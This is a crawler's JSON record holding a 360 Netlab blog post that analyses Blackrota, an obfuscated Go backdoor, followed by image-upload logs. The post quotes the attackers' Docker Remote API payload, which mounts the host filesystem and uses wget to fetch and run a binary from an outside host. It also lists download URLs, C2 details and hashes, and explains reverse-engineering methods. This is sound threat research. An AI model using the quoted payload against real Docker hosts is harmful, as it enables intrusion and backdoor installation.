{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-12-02 21:01:11","updatedTime":"2020-12-02 21:01:11","title":"Blackrota, a heavily obfuscated backdoor written in Go","link":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","description":"<blockquote>\n<p>The most obfuscated Go-developed ELF-formatted malware we've found<br>\nto date.</p>\n</blockquote>\n<h2 id=\"overview\">Overview</h2>\n<p>Recently, a malicious backdoor program written in the Go language that<br>\nexploits an unauthorized access vulnerability in the Docker Remote API<br>\nwas caught by the our <strong>Anglerfish</strong> honeypot. We named it <strong>Blackrota</strong>, given<br>\nthat its C2 domain name is <code>blackrota.ga</code> .</p>\n<p>The <strong>Blackrota</strong> backdoor is currently only available for Linux, in ELF file<br>\nformat, and supports both x86/x86-64 CPU architectures. Blackrota is<br>\nconfigured and compiled based on <strong><a href=\"https://github.com/darkr4y/geacon\">geacon</a></strong>, a CobaltStrike Beacon implemented in the Go language, which can be used as a CobalStrike Beacon that interacts with CobaltStrike to control compromised hosts:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/geacon-1.png\" class=\"kg-image\"></figure><p>However, it only implements some of the key functions in the original CobaltStrike Beacon:</p>\n<ul>\n<li><strong>CMD_SHELL</strong>: Execute Shell command;</li>\n<li><strong>CMD_UPLOAD</strong>: Upload files;</li>\n<li><strong>CMDDOWNLOAD</strong>: Download the specified file;</li>\n<li><strong>CMD_FILE_BROWSE</strong>: File browsing;</li>\n<li><strong>CMD_CD</strong>: Change directory；</li>\n<li><strong>CMD_SLEEP</strong>: Set the sleep delay time;</li>\n<li><strong>CMD_PWD</strong>: Return current directory;</li>\n<li><strong>CMD_EXIT</strong>: Exit.</li>\n</ul>\n<p>Unlike the original <strong>geacon</strong>, <strong>Blackrota</strong> uses <strong><a href=\"https://github.com/unixpickle/gobfuscate\">gobfuscate</a></strong> to obfuscate the<br>\nsource code before compiling. <strong>gobfuscate</strong> is an open-source tool for Go code<br>\nobfuscation, which can obfuscate the following elements of Go source code<br>\nwith random character substitutions:</p>\n<ul>\n<li><strong>Package Names</strong>;</li>\n<li><strong>Global Variable Names</strong>;</li>\n<li><strong>Function Names</strong>;</li>\n<li><strong>Type Names</strong>;</li>\n<li><strong>Method Names</strong>.</li>\n</ul>\n<p>In addition, gobfuscate replaces all strings used in the code with XOR<br>\nencodings, assigning each string an XOR Decoding function that dynamically decodes strings during program execution.</p>\n<p>The Go language uses fully static links to build binary files. As a result, all<br>\nthe codes used in standard and third-party libraries are packed into binary files, resulting in very large binary files. This characteristic, from a reverse analysis point of view, means that when you open a Go binary file in a disassembly tool, you will see thousands or even tens of thousands of functions. If these functions don't have corresponding symbolics, it will be difficult to reverse-analyze Go binary files.</p>\n<p>The good news is that the Go language has another mechanism: when building a binary, both the <strong>RTSI</strong>(Runtime Symbol Information) and the <strong>RTTI</strong>(Runtime Type Information) are packed into the binary and cannot be stripped. Currently, almost all the dedicated tools to help reverse engineering Go binaries try to recover those information from Go binaries to assist analyse process. Go projects often import many third-party open-source packages. Genrally, the recovered <strong>RTSI</strong> and <strong>RTTI</strong> will lead us to the corresponding open-source package, we can then read the source code of third-party packages, which will further increase the efficiency of reverse analysis.</p>\n<p><strong>Blackrota</strong> uses <strong>gobfuscate</strong> to obfuscate symbolic and type information, which is the &#34;life-door&#34; of such reverse-analysis tools. The symbolic information they parse and recover becomes unreadable, and it is not possible to make sense of the symbolic and type information, and it is not possible to know which third-party packages were imported to the project. This makes the reverse analysis process a lot more difficult.</p>\n<p>Historically, we have seen malware written in Go that was at best stripped at compiling time, and at worst slightly obfuscated, without much difficulty in reverse analysis. Blackrota brings a new approach to obfuscation, and is the most obfuscated Go-written malware in ELF format that we have found to date.</p>\n<h2 id=\"analysis\">Analysis</h2>\n<h3 id=\"thespreadofblackrota\">The spread of Blackrota</h3>\n<p>The author of <strong>Blackrato</strong> recruits multiple payloads for unauthorized use<br>\nof the Docker Remote API. A typical payload is simplified as follows:</p>\n<pre><code>POST /v1.37/containers/create HTTP/1.1\nHost: {target_host}:{target_port}\nUser-Agent: Docker-Client/19.03.7 (linux)\nContent-Length: 1687\nContent-Type: application/json\n\n{&#34;Env&#34;:[],&#34;Cmd&#34;:[&#34;/bin/sh&#34;,&#34;-c&#34;,&#34;rm ./32 ; wget https://semantixpublic.s3.amazonaws.com/itau-poc-elastic/32;chmod 777 32; nohup ./32 \\u003c/dev/null \\u003e/dev/null 2\\u003e\\u00261 \\u0026&#34;],&#34;Image&#34;:&#34;alpine&#34;,&#34;Volumes&#34;:{},&#34;WorkingDir&#34;:&#34;&#34;,&#34;HostConfig&#34;:{&#34;Binds&#34;:[&#34;/:/mnt&#34;]}\n</code></pre>\n<p>With a successful payload, the 32bit or 64bit Blackrota backdoor program will be downloaded from the following 2 URLs:</p>\n<pre><code>https://semantixpublic.s3.amazonaws.com/itau-poc-elastic/32\nhttps://semantixpublic.s3.amazonaws.com/itau-poc-elastic/64\n</code></pre>\n<h3 id=\"blackrotabackdoorprogram\">Blackrota backdoor program</h3>\n<p>As described above,<strong>Blackrota</strong> backdoor program was written in Go language, with the help of our <strong><a href=\"https://github.com/0xjiayu/go_parser\">go_parser</a></strong> in IDAPro, we can tell it was compiled from <strong>Go1.15.3</strong>, with <strong>GOROOT</strong> path <code>&#34;/usr/local/Cellar/ go/1.15.3/libexec&#34;</code>.In addition to these two valid pieces of information, the parsed source file paths, function names, global variable names, data type names, and method names bound to datat ypes are all obfuscated with random character substitutions and are unreadable.</p>\n<p>We can see the source file path list involved in the project (the directory of<br>\nthe source file is named with a random string):</p>\n<pre><code>/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/main.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/ohbafagkhnajkninglhh/http.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/ohbafagkhnajkninglhh/packet.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/ohbafagkhnajkninglhh/commands.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/idkinfdjhbmgpdcnhdaa/sysinfo_linux.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/idkinfdjhbmgpdcnhdaa/meta.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/knbgkjnkjabhokjgieap/djcomehocodednjcklap/ocphjmehllnbcjicmflh/setting.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/knbgkjnkjabhokjgieap/djcomehocodednjcklap/ocphjmehllnbcjicmflh/req.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/knbgkjnkjabhokjgieap/djcomehocodednjcklap/ocphjmehllnbcjicmflh/resp.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/knbgkjnkjabhokjgieap/djcomehocodednjcklap/ocphjmehllnbcjicmflh/dump.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/pmdjfejhfmifhmelifpm/util.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/aooeabfbhioognpciekk/rsa.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/aooeabfbhioognpciekk/rand.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/aooeabfbhioognpciekk/aes.go\n/var/folders/m_/s3tbbryj529_gr23z27b769h0000gn/T/762993410/src/ammopppfcdmmecpgbkkj/mmkgdoebocpnpabeofch/eepmoknkdieemfhjjjgl/config.go\n</code></pre>\n<h3 id=\"blackrotasfunctionsymblos\">Blackrota's function symblos</h3>\n<p>From the above parsing results, the biggest obstacle to reverse analysis is that the function names, type names, and method names are obfuscated into meaningless random characters in the source code of the third-party packages imported from the <strong>Blackrota</strong> sample. Partial list of functions after parsing:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/obfuscated_funcs-1.png\" class=\"kg-image\"></figure><p>Obfuscated data type definition:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/obfuscated_type-1.png\" class=\"kg-image\"></figure><p>In addition, there are still some method names bound to data types that are<br>\nnot completely obfuscated:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/half_obfuscated_meth_name-1.png\" class=\"kg-image\"></figure><p>With thousands of random string-named functions and a large number of randomly-named data types, methods, and global variables, we could not be sure what third-party Go packages were used inside the sample, making the reverse analysis almost impossible to move forward. Eventually, after some careful analysis, we discovered that the Blackrota sample was compiled from <strong>geacon</strong>.</p>\n<p>In this way, we can try to recover the function symbols in the <strong>Blackrota</strong> sample using the following steps.</p>\n<ol>\n<li>Compile a geacon binary with the same CPU architecture as the Blackrota sample, without stripped;</li>\n<li>Use <strong><a href=\"https://github.com/fireeye/flare-ida/blob/master/python/flare/idb2pat.py\">idb2pat.py</a></strong> in IDAPro to extract the pattern(<strong>geacon.pat</strong>) of the <strong>geacon</strong>'s functions;</li>\n<li>Use the <strong>sigmake</strong> in Flair Tools set to create a Flirt Signature file for geacon<br>\n(<strong>geacon.sig</strong>).</li>\n<li>Import <strong>geacon.sig</strong> to <strong>Blackrota</strong>'s sample in IDAPro, identify and recover the function symbols.</li>\n</ol>\n<p>Progress made! But don't get too excited yet, because we found out that <strong>Blackrota</strong>'s function symbols are not completely recognized, and there are about a hundred functions that are not covered by geacon's symbols, some of which are recognized as follows:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/part_of_recovered_funcname-1.png\" class=\"kg-image\"></figure><h3 id=\"stringsinblackrota\">Strings in Blackrota</h3>\n<p>In the analysis above, we saw that only a very few of the strings used in the Go standard packages are parsed in <strong>Blackrota</strong>, while the strings inside <strong>geacon</strong> are not parsed. The problem lies in the functions above that are not covered by the geacon symbol.</p>\n<p>From our analysis, we see that <strong>Blackrota</strong> XOR-encodes all the strings it uses internally, and dynamically decodes the strings at runtime to refer back to them. For each string, there is an XOR decoder function. <strong>gobfuscate</strong> generates a random XOR key of the same length as the string, solves a string of characters and returns it, and the solved string is referenced in the parent function. One of the key parts of the XOR decoding function is shown in the following figure:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/xor_func-1.png\" class=\"kg-image\"></figure><p>If we want to decode all the strings, we need to find each string encoding function, find the Encoded Bytes and XOR Key, and solve the strings using the XOR algorithm. This will increase a lot of work to the reverse analysis effort, and also help the program to avoid the automated detection of security products to some extent.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Obfuscated malware written in Go is rare, except for a few simple attempts by white hats, but only two have been seen before: one is the ransomeware exposed by <a href=\"https://twitter.com/joakimkennedy\">@joakimkennedy</a>  that only obfuscates function symbols in <code>package main</code>:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/obfu_ransom-1.png\" class=\"kg-image\"></figure><p>That program simply obfuscates the names of a few functions in the main package and hardly causes any issue to the reverse analysis:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/obfu_ransom_funcnames-1.png\" class=\"kg-image\"></figure><p>The other one is another ransomeware <strong><a href=\"https://www.dragos.com/blog/industry-news/ekans-ransomware-and-ics-operations/\">EKANS</a></strong>, which uses the same obfuscation method as Blackrota:</p>\n<figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/11/ekans_srcfile-1.png\" class=\"kg-image\"></figure><p>The obfuscation method of Blackrota and EKANS creates new challenges for reverse analysis. As the Go language becomes more popular, more and more malware will be written in Go in the future, we will keep an eye on what is going to happen.</p>\n<h2 id=\"iocs\">IoCs:</h2>\n<h3 id=\"md5\">MD5</h3>\n<pre><code>e56e4a586601a1130814060cb4bf449b\n6e020db51665614f4a2fd84fb0f83778\n9ca7acc98c17c6b67efdedb51560e1fa\n</code></pre>\n<h3 id=\"cc\">C&#38;C</h3>\n<pre><code>blackrato.ga    165.227.199.214    ASN: 14061|DigitalOcean,_LLC\n</code></pre>\n","descriptionType":"html","publishedDate":"Tue, 24 Nov 2020 13:48:40 +0000","feedId":9360,"bgimg":"https://blog.netlab.360.com/content/images/2020/11/geacon-1.png","linkMd5":"c4b9c7fef53db13c0f9630cd43c4f35d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn72@2020_6/2020/12/02/13-01-17-817_18f962dc74587e48.webp","destWidth":1710,"destHeight":1069,"sourceBytes":306846,"destBytes":109692,"author":"JiaYu","articleImgCdnMap":{"https://blog.netlab.360.com/content/images/2020/11/geacon-1.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn72@2020_6/2020/12/02/13-01-17-817_18f962dc74587e48.webp","https://blog.netlab.360.com/content/images/2020/11/obfuscated_funcs-1.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn17@2020_5/2020/12/02/13-01-24-739_79e690bc60c582ce.webp","https://blog.netlab.360.com/content/images/2020/11/obfuscated_type-1.png":null,"https://blog.netlab.360.com/content/images/2020/11/half_obfuscated_meth_name-1.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn29@2020_6/2020/12/02/13-01-34-953_28f5eb6e09ecab01.webp","https://blog.netlab.360.com/content/images/2020/11/part_of_recovered_funcname-1.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn22@2020_1/2020/12/02/13-01-22-152_d47f58e29e53ee8b.webp","https://blog.netlab.360.com/content/images/2020/11/xor_func-1.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn15@2020_4/2020/12/02/13-01-23-161_5c6cb2a24c973769.webp","https://blog.netlab.360.com/content/images/2020/11/obfu_ransom-1.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn4@2020_1/2020/12/02/13-01-24-214_6e1918b6a90a28d3.webp","https://blog.netlab.360.com/content/images/2020/11/obfu_ransom_funcnames-1.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn11@2020_2/2020/12/02/13-01-23-826_ce17f55d4b3854f2.webp","https://blog.netlab.360.com/content/images/2020/11/ekans_srcfile-1.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn6@2020_6/2020/12/02/13-01-28-604_8b1a1860547b80be.webp"},"publishedOrCreatedDate":1606914071202}],"record":{"createdTime":"2020-12-02 21:01:11","updatedTime":"2020-12-02 21:01:11","feedId":9360,"fetchDate":"Wed, 02 Dec 2020 13:01:11 +0000","fetchMs":2841,"handleMs":20,"totalMs":29742,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"780a3eae2f6c220f6dfdc342a09dce30","hostName":"us-025*","requestId":"04082c8e38494a4980ff060411a4b813_9360","contentType":"text/xml; charset=utf-8","totalBytes":1350272,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":9,"articlesImgsGithubTotal":8,"successGithubMap":{"myreaderx25":1,"myreaderx7":1,"myreaderx15":1,"myreaderx10":1,"myreaderx3":1,"myreaderx1":1,"myreaderx13":1,"myreaderx30":1},"failGithubMap":{"myreaderx23":1}},"feed":{"createdTime":"2020-08-25 04:35:03","updatedTime":"2020-09-05 15:59:59","id":9360,"name":"360 Netlab Blog - Network Security Research Lab at 360","url":"http://blog.netlab.360.com/rss/","subscriber":null,"website":null,"icon":"https://blog.netlab.360.com/favicon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx64/cdn16@2020_1/2020/09/05/07-59-55-602_11aad37390d7d139.png","description":"Network Security Research Lab at 360","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-12-02 21:01:36","updatedTime":"2020-12-02 21:01:36","id":null,"feedId":9360,"linkMd5":"c4b9c7fef53db13c0f9630cd43c4f35d"}],"tmpCommonImgCdnBytes":109692,"tmpBodyImgCdnBytes":1240580,"tmpBgImgCdnBytes":0,"extra4":{"start":1606914066762,"total":0,"statList":[{"spend":4420,"msg":"获取xml内容"},{"spend":20,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":17251,"msg":"正文链接上传到cdn"}]},"extra5":9,"extra6":9,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/obfuscated_type-1.png","sourceStatusCode":200,"destWidth":2563,"destHeight":717,"sourceBytes":204575,"destBytes":141136,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":3735,"convertSpendMs":136,"createdTime":"2020-12-02 21:01:19","host":"us-003*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn25/contents/2020/12/02/13-01-22-939_75b9966df061141c.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Wed, 02 Dec 2020 13:01:23 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["DA78:0F6B:208E63:5ADC01:5FC79013"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1606914565"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn25/contents/2020/12/02/13-01-22-939_75b9966df061141c.webp","historyStatusCode":[],"spendMs":65},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"199.8 KB","destSize":"137.8 KB","compressRate":"69%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/obfuscated_type-1.png","sourceStatusCode":200,"destWidth":2563,"destHeight":717,"sourceBytes":204575,"destBytes":141136,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":10498,"convertSpendMs":122,"createdTime":"2020-12-02 21:01:23","host":"us-003*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn25/contents/2020/12/02/13-01-33-394_75b9966df061141c.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Wed, 02 Dec 2020 13:01:33 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["CF2A:7612:D37032:1A77BCF:5FC7902D"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1606914565"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn25/contents/2020/12/02/13-01-33-394_75b9966df061141c.webp","historyStatusCode":[],"spendMs":119},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"199.8 KB","destSize":"137.8 KB","compressRate":"69%"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://europe-25.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-24.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-028.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe67.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-015.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/geacon-1.png","sourceStatusCode":200,"destWidth":1710,"destHeight":1069,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn72@2020_6/2020/12/02/13-01-17-817_18f962dc74587e48.webp","sourceBytes":306846,"destBytes":109692,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":8030,"convertSpendMs":121,"createdTime":"2020-12-02 21:01:11","host":"us-55*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d,c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"299.7 KB","destSize":"107.1 KB","compressRate":"35.7%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/part_of_recovered_funcname-1.png","sourceStatusCode":200,"destWidth":1121,"destHeight":1062,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn22@2020_1/2020/12/02/13-01-22-152_d47f58e29e53ee8b.webp","sourceBytes":116470,"destBytes":173390,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":3963,"convertSpendMs":69,"createdTime":"2020-12-02 21:01:19","host":"us-015*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"113.7 KB","destSize":"169.3 KB","compressRate":"148.9%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/xor_func-1.png","sourceStatusCode":200,"destWidth":1152,"destHeight":1432,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn15@2020_4/2020/12/02/13-01-23-161_5c6cb2a24c973769.webp","sourceBytes":100096,"destBytes":112122,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":5211,"convertSpendMs":92,"createdTime":"2020-12-02 21:01:19","host":"europe67*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"97.8 KB","destSize":"109.5 KB","compressRate":"112%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/obfu_ransom_funcnames-1.png","sourceStatusCode":200,"destWidth":557,"destHeight":884,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn11@2020_2/2020/12/02/13-01-23-826_ce17f55d4b3854f2.webp","sourceBytes":78557,"destBytes":66376,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":5884,"convertSpendMs":30,"createdTime":"2020-12-02 21:01:19","host":"europe63*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"76.7 KB","destSize":"64.8 KB","compressRate":"84.5%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/obfu_ransom-1.png","sourceStatusCode":200,"destWidth":1022,"destHeight":1323,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn4@2020_1/2020/12/02/13-01-24-214_6e1918b6a90a28d3.webp","sourceBytes":494233,"destBytes":116648,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":6307,"convertSpendMs":77,"createdTime":"2020-12-02 21:01:19","host":"europe-24*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"482.6 KB","destSize":"113.9 KB","compressRate":"23.6%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/obfuscated_funcs-1.png","sourceStatusCode":200,"destWidth":1286,"destHeight":2146,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn17@2020_5/2020/12/02/13-01-24-739_79e690bc60c582ce.webp","sourceBytes":286785,"destBytes":445472,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":6632,"convertSpendMs":127,"createdTime":"2020-12-02 21:01:19","host":"us-028*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"280.1 KB","destSize":"435 KB","compressRate":"155.3%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/ekans_srcfile-1.png","sourceStatusCode":200,"destWidth":974,"destHeight":672,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn6@2020_6/2020/12/02/13-01-28-604_8b1a1860547b80be.webp","sourceBytes":313682,"destBytes":146110,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":8651,"convertSpendMs":48,"createdTime":"2020-12-02 21:01:21","host":"europe-25*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"306.3 KB","destSize":"142.7 KB","compressRate":"46.6%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/half_obfuscated_meth_name-1.png","sourceStatusCode":200,"destWidth":2371,"destHeight":875,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn29@2020_6/2020/12/02/13-01-34-953_28f5eb6e09ecab01.webp","sourceBytes":254144,"destBytes":180462,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":17087,"convertSpendMs":67,"createdTime":"2020-12-02 